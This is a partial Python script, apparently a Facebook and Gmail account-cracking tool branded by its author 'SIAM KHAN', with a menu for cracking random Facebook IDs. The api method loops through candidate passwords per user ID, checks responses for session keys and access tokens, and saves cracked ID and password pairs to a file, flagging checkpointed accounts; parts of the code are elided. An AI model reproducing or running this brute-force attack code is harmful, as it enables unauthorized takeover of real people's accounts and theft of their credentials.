...
class Main:
	def __init__(self):
		...
		self.cp = []
		self.loop = 0
		self.ips = requests.get("https://facebook.com").text
		os.system("clear")
		jalan(" \033[38;5;46m••••𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗨𝗕𝗦𝗖𝗥𝗔𝗜𝗕𝗘 𝗠𝗬 𝗬𝗢𝗨𝗧𝗬𝗕𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ꫀƙక కỉꪖꪑ:) ＴＨＡＮＫＳ ＹＯＵ")
		os.system("xdg-open https://https://github.com/")
		time.sleep(4)
		os.system("clear")
		os.system("figlet SIAM")                                                 
		print("\n  (Programmed By 𝗦𝗜𝗔𝗠 𝗞𝗛𝗔𝗡 )") 
		print("\n  (Facebook : 𝗦𝗜𝗔𝗠 𝗞𝗛𝗔𝗡'siam )") 
		print("\n  (WhatsApp +8801309132215 )") 
		print(" ( https://https://github.com/ )\n") 
		
		print("         [ ☠️₦Ø ⱠØ₲ł₦ ₣₳₵Ɇ฿ØØ₭☠️ ]")
		print(" -------------------------------------")

		print(" -------------------------------------")
		print("\n [01]. 😴𝗖𝗥𝗘𝗔𝗞 𝗥𝗔𝗡𝗗𝗢𝗠 𝗜𝗗 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗡𝗘𝗪😴")
		print(" [02]. 😮‍💨𝗖𝗥𝗘𝗔𝗞 𝗥𝗔𝗡𝗗𝗢𝗠 𝗜𝗗 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗔𝗞𝗧𝗢 𝗡𝗘𝗪😮‍💨 ")
		print(" [03]. 😈𝗖𝗥𝗘𝗔𝗞 𝗥𝗔𝗡𝗗𝗢𝗠 𝗜𝗗 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗢𝗟𝗗😈 ")
		print(" [04]. 🥱𝗖𝗥𝗘𝗔𝗞 𝗥𝗔𝗡𝗗𝗢𝗠 𝗚𝗠𝗔𝗜𝗟🥱 ")
		print(" [05]. 😡𝗥𝗘𝗣𝗢𝗥𝗧😡")
		tanya = input("\n [•] choose : ")
		if tanya in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [SIAM-OK]:-%s - [SIAM-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SIAM-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SIAM-CP] %s • %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/Hamii-king-06")
		exit()
	else:
		Main()
